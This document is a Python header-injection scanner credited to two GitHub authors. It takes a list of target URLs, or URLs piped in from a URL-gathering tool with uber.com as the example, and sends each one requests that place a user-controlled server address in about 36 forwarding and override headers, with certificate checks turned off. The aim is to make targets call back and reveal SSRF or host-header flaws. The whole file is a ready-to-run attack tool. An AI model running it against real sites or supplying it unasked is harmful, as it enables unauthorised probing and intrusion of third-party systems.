#!/usr/bin/python3

# m4ll0k - github.com/m4ll0k
# storenth - github.com/storenth

import requests
import urllib3
import sys 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

injectable_headers = [
    "Proxy-Host",
    "Request-URI",
    "Request",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwarded-Host",
    "X-Forwarded-Server",
    "X-Forwarder-For",
    "X-Forward-For",
    "X-Host",
    "X-Http-Destinationurl",
    "X-Http-Host-Override",
    "X-Original-Remote-Addr",
    "X-Original-URL",
    "X-Rewrite-URL",
    "x-http-path-override",
    "X-Proxy-Url",
    "X-Rewrite-Url",
    "X-Real-Ip",
    "X-Remote-Addr",
    "X-Remote-IP",
    "X-Originating-IP",
    "X-Custom-IP-Authorization",
    "X-Client-IP",
    "Base-Url",
    "Http-Url",
    "Proxy-Url",
    "Redirect",
    "Real-Ip",
    "Referer",
    "Referrer",
    "Refferer",
    "URI",
    "URL"
]

def read_file(file_path:str)->None:
    try:
        return [x.strip() for x in open(file_path,'r+')]
    except Exception as err:
        sys.exit(
            print('[ERROR] %s'%err)
        )

def url_check(url:str)->str:
    url = url.replace(':80','').replace(':443','')
    return url

def main(url:str,ip:str):
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    for header in injectable_headers:
        headers[header] = ip
    try:
        #print('[ + ] URL: %s'%url)
        request = requests.get(
            url = url,
            headers = headers,
            verify = False,
            allow_redirects = False,
            timeout = (5, 15)
        )
        print('[ + ] Code: {code} - {url}'.format(code=request.status_code, url=request.url))
        print('url={url} \theaders={headers}\n'.format(url=url, headers=request.request.headers))
    except Exception as err:
        sys.exit(
            print('[ERROR] {}'.format(err))
        )

def usage():
    print('Usage:\n\tpython3 {tool} <targets.txt> <your_server>\n\tgau uber.com | python3 {tool} <your_server>'.format(tool=sys.argv[0]))
    sys.exit(0)

if len(sys.argv) == 1:
    usage()

if len(sys.argv) == 3:
    for url in read_file(sys.argv[1]):
        main(url,sys.argv[2])
else:
    for target in sys.stdin.readlines():
        target_ = target.strip()
        if len(sys.argv) == 1 or len(sys.argv) > 2:
            usage()
        if target == '\n':
            usage()
        main(target_,sys.argv[1])
